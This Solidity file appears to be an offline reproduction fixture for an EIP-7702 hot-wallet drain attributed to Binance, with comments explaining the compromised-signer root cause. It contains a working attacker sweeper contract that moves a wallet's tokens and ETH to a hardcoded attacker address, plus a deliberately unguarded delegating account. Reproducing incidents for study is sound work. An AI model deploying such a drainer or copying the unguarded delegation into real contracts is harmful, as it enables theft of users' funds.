// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Minimized OFFLINE reproduction of the Binance 14 EIP-7702 hot-wallet drain (2026-10-29, the
// largest crypto theft on record; figures vary across reports, ~$2.5B in the first Binance 14 drain
// and multi-billion across chains). Authored in THIS repo (MIT). This is NOT a copy of the on-chain
// sweeper bytecode and NOT a copy of any third-party PoC. The documented MECHANISM is reproduced
// from authoritative write-ups; see ./binance14-victim/PROVENANCE.md for the incident facts
// (victim, sweeper, pinned tx hashes, on-chain verification, sources).
//
// Root cause (per Binance's incident report / Blockaid / ChainCatcher / Gizmodo / Wikipedia): the
// attacker gained control of Binance's MPC signing service and had it sign EIP-7702 SET_CODE
// (type-4) authorizations for the Binance 14 hot wallet. One authorization delegated the EOA's code
// to an attacker-deployed sweeper contract (deployed hours earlier) that HARDCODED the attacker as
// the only allowed caller. The attacker then called the now-delegated account, and the sweeper ran
// in the account's context and moved its ETH and tokens to the attacker's aggregation address in a
// single transaction. Because the delegation lives on Ethereum, Binance's app-layer withdrawal
// suspension did not stop it; Binance later cleared the delegation by authorizing the zero address.
//
// As elsewhere in this corpus, the "code runs as the account" semantics is modeled EXPLICITLY via
// delegatecall (no vm.signDelegation dependency) so the fixture is deterministic on any toolchain.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @title BinanceSweeperDelegate - the attacker's EIP-7702 delegate, gated to the attacker only.
/// @notice When installed as the account's delegate and activated BY THE HARDCODED ATTACKER, this
///         runs in the account's context and moves the account's ETH and a token balance to the
///         attacker's aggregation address in one call. The hardcoded-caller gate distinguishes this
///         private sweeper from the reusable public "CrimeEnjoyor".
contract BinanceSweeperDelegate {
    // Hardcoded at deploy time: the only address allowed to trigger the sweep.
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function sweep(address token) external {
        require(msg.sender == attacker, "only attacker"); // hardcoded caller gate
        uint256 t = IERC20(token).balanceOf(address(this));
        if (t != 0) IERC20(token).transfer(attacker, t);
        (bool ok,) = payable(attacker).call{value: address(this).balance}("");
        require(ok, "eth-sweep-failed");
    }
}

/// @title BinanceVulnerableAccount - an EOA delegated via a maliciously-signed 7702 authorization.
/// @notice No delegation policy: whatever delegate the (maliciously signed) authorization names runs
///         in its own context. The signing authority here was the compromised MPC service.
contract BinanceVulnerableAccount {
    address public delegate;

    function installDelegation(address delegate_) external {
        delegate = delegate_;
    }

    function activate(bytes calldata data) external returns (bytes memory) {
        require(delegate != address(0), "no delegation");
        (bool ok, bytes memory ret) = delegate.delegatecall(data);
        require(ok, "delegate execution failed");
        return ret;
    }

    receive() external payable {}
}
